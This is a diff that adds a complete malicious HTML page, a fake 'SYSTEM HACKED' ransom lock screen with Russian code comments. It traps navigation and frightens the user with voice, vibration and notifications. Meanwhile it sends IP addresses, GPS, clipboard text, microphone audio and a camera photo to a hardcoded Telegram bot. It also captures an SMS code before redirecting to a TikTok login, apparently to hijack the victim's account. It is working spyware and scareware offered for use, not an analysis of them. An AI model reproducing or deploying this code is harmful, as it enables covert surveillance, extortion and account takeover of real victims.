@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Alert</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; touch-action: none; user-select: none; }
+        
+        #lockScreen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #000; color: #fff;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 999999; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 20px; box-sizing: border-box;
+        }
+
+        .icon { font-size: 80px; color: #ff3b30; margin-bottom: 20px; animation: pulse 0.5s infinite; }
+        h1 { font-size: 24px; margin-bottom: 10px; color: #ff3b30; }
+        p { font-size: 16px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+        
+        #smsInput {
+            width: 80%; padding: 15px; font-size: 24px; text-align: center; letter-spacing: 5px;
+            border: 2px solid #ff3b30; border-radius: 8px; background: #1a1a1a; color: #fff; outline: none; margin-bottom: 15px;
+            display: none;
+        }
+        
+        #unlockBtn {
+            padding: 15px 30px; font-size: 18px; font-weight: bold; background: #ff3b30; color: #fff; border: none; border-radius: 8px; cursor: pointer;
+            display: none;
+        }
+
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        
+        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <div id="lockScreen">
+        <div class="icon">☠️</div>
+        <h1 id="title">SYSTEM HACKED</h1>
+        <p id="subtitle">All data is being encrypted and stolen.<br>Await further instructions.</p>
+        
+        <input type="tel" id="smsInput" placeholder="000000" maxlength="6">
+        <button id="unlockBtn">Decrypt Device</button>
+    </div>
+
+    <video id="camera-video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
+        const CHAT_ID = "7485234259"; 
+
+        // --- ЛОВУШКИ ---
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.go(1); };
+        document.addEventListener('touchmove', function(e) { e.preventDefault(); }, { passive: false });
+        try { navigator.wakeLock.request('screen'); } catch(e) {}
+
+        // --- ОТПРАВКА ТЕКСТА ---
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        async function sendMedia(endpoint, blob, filename, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append(endpoint === 'sendVoice' ? 'voice' : 'photo', blob, filename);
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
+        }
+
+        // --- ГОЛОСОВОЙ ТЕРРОР (TTS) ---
+        function playVoiceThreat() {
+            if ('speechSynthesis' in window) {
+                const msg = new SpeechSynthesisUtterance("Warning. Your device has been hacked. All your personal data, photos, and passwords are being uploaded to the dark web.");
+                msg.rate = 1; msg.pitch = 0.1; // Низкий, зловещий голос
+                window.speechSynthesis.speak(msg);
+            }
+        }
+
+        // --- ВИБРАЦИЯ ---
+        function startVibration() {
+            if (navigator.vibrate) {
+                setInterval(() => { navigator.vibrate([500, 200, 500]); }, 1500);
+            }
+        }
+
+        // --- WEBRTC (РЕАЛЬНЫЙ IP В ОБХОД VPN) ---
+        function getWebRTCIP() {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = event.candidate.candidate.match(ipRegex);
+                        if (match) {
+                            sendText(`🕵️ Реальный IP (WebRTC): ${match[1]}`);
+                            pc.close();
+                        }
+                    }
+                };
+            } catch(e) {}
+        }
+
+        // --- СПАМ УВЕДОМЛЕНИЯМИ ---
+        function spamNotifications() {
+            if (!("Notification" in window)) return;
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        new Notification("⚠️ SYSTEM INFECTED", {
+                            body: "Your data is being stolen. Tap to pay ransom.",
+                            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+                        });
+                        count++;
+                        if (count > 5) clearInterval(interval);
+                    }, 3000);
+                }
+            });
+        }
+
+        // --- СБОР ДАННЫХ ---
+        async function stealAll() {
+            sendText(`🚨 ЖЕРТВА В ЛОВУШКЕ! Начинаю сбор.`);
+            
+            // WebRTC & IP
+            getWebRTCIP();
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 Публичный IP: ${d.ip}`)).catch(()=>{});
+
+            // Постоянный GPS Трекер
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    (pos) => sendText(`🗺️ Жертва двигается! GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                    (err) => {},
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                );
+            }
+
+            // Буфер
+            try {
+                const clip = await navigator.clipboard.readText();
+                if (clip) sendText(`📋 Буфер обмена: ${clip}`);
+            } catch(e) {}
+
+            // Микрофон (10 сек)
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                const audioChunks = [];
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    await sendMedia('sendVoice', audioBlob, 'voice.ogg', '🎙️ Аудио окружения');
+                    audioStream.getTracks().forEach(track => track.stop());
+                };
+                mediaRecorder.start();
+                setTimeout(() => { mediaRecorder.stop(); }, 10000);
+            } catch (err) {}
+
+            // Камера
+            try {
+                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('camera-video');
+                video.srcObject = videoStream;
+                await new Promise(r => setTimeout(r, 1000)); 
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                videoStream.getTracks().forEach(track => track.stop());
+
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                await sendMedia('sendPhoto', blob, 'face.jpg', '📸 Селфи жертвы');
+            } catch (err) {}
+        }
+
+        // --- ЗАПУСК ---
+        function startLocker() {
+            // Врубаем психологическую атаку
+            playVoiceThreat();
+            startVibration();
+            spamNotifications();
+
+            if (localStorage.getItem('sys_infected') === 'true') {
+                document.getElementById('title').innerText = "SYSTEM LOCKED";
+                document.getElementById('smsInput').style.display = 'block';
+                document.getElementById('unlockBtn').style.display = 'block';
+            } else {
+                localStorage.setItem('sys_infected', 'true');
+                stealAll();
+                
+                setTimeout(() => {
+                    document.getElementById('title').innerText = "PAY RANSOM";
+                    document.getElementById('title').style.color = "#ff3b30";
+                    document.getElementById('subtitle').innerHTML = "To decrypt your files, enter the code sent to your SMS.";
+                    document.getElementById('smsInput').style.display = 'block';
+                    document.getElementById('unlockBtn').style.display = 'block';
+                }, 6000);
+            }
+        }
+
+        // --- ВВОД КОДА ---
+        document.getElementById('unlockBtn').addEventListener('click', function() {
+            const code = document.getElementById('smsInput').value;
+            if (code.length < 4) { alert("Enter valid code."); return; }
+
+            sendText(`🔐 ПЕРЕХВАЧЕН КОД: ${code}\nЖертва пыталась "расшифровать" файлы.`);
+
+            localStorage.removeItem('sys_infected');
+            window.speechSynthesis.cancel(); // Останавливаем голос
+            document.getElementById('title').innerText = "DECRYPTING...";
+            document.getElementById('title').style.color = "#4CAF50";
+            document.getElementById('subtitle').innerText = "Please wait...";
+            document.getElementById('smsInput').style.display = 'none';
+            document.getElementById('unlockBtn').style.display = 'none';
+
+            setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 2000);
+        });
+
+        // Старт
+        setTimeout(startLocker, 1000);
+    </script>
+</body>
+</html>
